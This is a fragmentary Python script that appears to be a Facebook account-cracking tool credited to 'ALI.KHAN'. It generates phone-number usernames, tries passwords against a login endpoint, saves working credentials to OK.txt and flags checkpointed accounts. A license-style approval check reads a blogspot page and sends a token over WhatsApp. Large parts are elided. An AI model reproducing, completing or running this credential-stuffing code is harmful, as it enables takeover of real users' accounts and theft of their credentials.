...
print("")
print("%s╔══════════════════════════════════════════╗"%(Z))	
print("%s║%s  Author   : %sALI.KHAN                     %s║"%(Z,B,M,Z))
print("%s║%s  Github   : https://github.com/pro-xiddi %s║"%(Z,B,Z))
print("%s║%s  facebook  :web.facebook.com/ali.timeline%s║"%(Z,B,Z))
print("%s║%s  Version  : %s7.0%s                          ║"%(Z,B,H,Z))
print("%s╚══════════════════════════════════════════╝"%(Z))
print("")
...
def random_number():
	...
	print(f" {M}FOR EXAMPLE : {Z}[{H}+9212345XXXX{Z}]\n")
	...
	try:
		for pw in pwx:
			...
			if "session_key" in result:
				print('\033[1;32m [ALI-OK] '+user+'|'+pw+'\033[0;97m')
				open('OK.txt', 'a').write(user+'|'+pw+'\n')
				oks.append(user)
				break
			elif "www.facebook.com" in result["error_msg"]:
				print("")
				print('\033[1;31m [ALI-CP] '+user+'|'+pw+'\033[0;97m')
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://xiddi302.blogspot.com/2023/02/xidditxt.html?m=1').text
    if id in httpCaht:
...
#'__main__'
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/++923422542642?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
